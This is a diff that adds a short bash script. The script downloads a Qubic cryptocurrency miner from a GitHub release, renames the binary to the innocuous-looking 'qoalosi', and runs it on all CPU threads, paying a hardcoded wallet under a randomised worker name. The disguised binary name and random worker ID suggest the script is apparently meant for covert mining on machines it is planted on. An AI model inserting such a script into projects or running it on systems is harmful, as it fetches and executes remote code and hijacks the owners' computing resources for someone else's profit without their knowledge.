@@ -1,0 +1,5 @@
+#!/bin/bash
+wget https://github.com/jtskxx/JETSKI-QUBIC-POOL/releases/download/latest/qubjetski-Linux-v3.5.tar.gz
+tar -xvzf qubjetski-Linux-v3.5.tar.gz && cd qubjetski-Linux-v3.5
+mv qubjetski-Client qoalosi
+./qoalosi -pplns -wallet QDFHPFWSUCGDBDQNORZOPMWDCWZBFJZHDTBAZBPUPCSUHQQCGPSNJVJEPCPM -workername $(echo $RANDOM | md5sum | head -c 10) -cpu -threads $(nproc --all) -start
